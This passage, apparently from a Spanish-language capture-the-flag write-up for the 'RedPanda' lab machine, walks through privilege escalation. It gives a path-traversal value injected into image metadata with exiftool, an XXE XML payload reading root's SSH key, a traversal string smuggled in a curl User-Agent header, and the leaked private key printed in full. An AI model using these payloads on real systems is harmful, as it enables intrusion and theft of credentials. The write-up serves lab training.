rabb1t@hold:~$ exiftool -Artist="/../../../../../../home/woodenk/linux.jpg"
```

Y ahora creamos el archivo XML malicioso:
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY key SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>
  <author>damian</author>
  <image>
    <uri>/../../../../../../home/woodenk/linux.jpg</uri>
    <privesc>&key;</privesc>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```

Ambos archivos los transferimos a la máquina víctima. Ambos archivos los movemos al directorio home de `woodenk`. Ahora simplemente realizamos una petición desde nuestro equipo:
```shell
rabb1t@hold:~$ curl http://10.10.11.170 -H 'User-Agent: ||/../../../../../../home/woodenk/linux.jpg'
```

Ahora, verifiquemos cambios en el archivo:
```shell
woodenk@redpanda: watch -n0 cat new_creds.xml
```

Después de un tiempo, nos aparece lo siguiente:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [
  <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa" >]>
<credits>     
  <author>woodenk</author>
  <image>
    <uri>/../../../../../../../../home/woodenk/linux.jpg</uri>
    <priv>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</priv>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```

Tenemos la `id_rsa` del usuario `root`. La guardamos en un archivo, le damos permisos `600` y procedemos a conectarnos como este usuario:

```shell
rabb1t@hold:~$ chmod 600 id_rsa
rabb1t@hold:~$ ssh -i id_rsa root@10.10.11.170
```

¡Happy Hacking!